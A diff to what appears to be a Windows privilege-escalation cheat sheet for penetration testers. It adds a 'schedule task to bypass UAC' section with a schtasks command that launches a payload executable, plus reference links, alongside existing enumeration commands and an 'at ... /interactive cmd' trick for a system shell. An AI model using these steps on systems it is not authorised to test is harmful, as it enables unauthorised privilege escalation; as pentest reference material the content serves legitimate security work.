@@ -237,6 +237,8 @@ reg query HKLM /s /d /f "C:\* *.exe" | find /I "C:\" | find /V """"
 
 #### Scheduled tasks
 
+
+
 schtasks /query /fo LIST /v
 
 Check this file:
@@ -256,6 +258,15 @@ Get the current time of the workstation
 C:\> at 12:51 /interactive cmd
 
 After the at command reconfirm your access privs
+
+### schedule task to bypass UAC
+
+https://pentestlab.blog/2017/05/03/uac-bypass-task-scheduler/
+
+```
+C:\>SchTasks /Create /SC DAILY /TN "NoUAC" /TR "C:\Users\User\Desktop\pentestlab3
+.exe" /ST 23:36
+```
 
 #### sam file 
 
@@ -924,6 +935,8 @@ accesschk.exe -ucqv SSDPSRV /accepteula
 accesschk.exe -ucqv upnphost /accepteula
 
 #### look for service properties to modify
+
+https://toshellandback.com/2015/11/24/ms-priv-esc/
 
 sc qc Spooler
 
